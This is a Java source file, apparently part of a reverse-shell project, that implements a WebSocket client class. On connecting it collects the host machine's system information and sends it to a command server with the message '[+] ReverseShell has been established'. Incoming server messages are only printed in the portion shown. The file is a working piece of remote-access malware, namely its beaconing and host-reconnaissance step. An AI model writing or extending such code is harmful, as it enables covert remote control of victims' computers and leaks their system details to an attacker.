package com.mtattab.reverseshell.service.impl;

import com.mtattab.reverseshell.model.ServerRestCommunicationModel;
import com.mtattab.reverseshell.service.WebsocketReverseShellService;
import com.mtattab.reverseshell.util.DataManipulationUtil;
import com.mtattab.reverseshell.util.OSUtil;
import lombok.Getter;
import lombok.Setter;
import lombok.extern.java.Log;
import org.eclipse.jetty.websocket.api.Session;
import org.eclipse.jetty.websocket.api.WebSocketAdapter;


import java.io.IOException;

@Getter
@Setter
@Log
public class WebSocketImpl extends WebSocketAdapter {

    private Session session;


    @Override
    public void onWebSocketText(String message) {
        System.out.println( message);
    }
    @Override
    public void onWebSocketConnect(Session session){
        this.session= session;
        try {
//            send initial message with computer info the command server
            ServerRestCommunicationModel initialCommunicationMessage=  OSUtil.getComputerInfo();
            initialCommunicationMessage.setReply("[+] ReverseShell has been established");

            session.getRemote()
                    .sendString(
                            DataManipulationUtil.convertObjToJson(initialCommunicationMessage)
            );
        } catch (IOException e) {
            e.printStackTrace();
            throw new RuntimeException(e);
        }
    }







}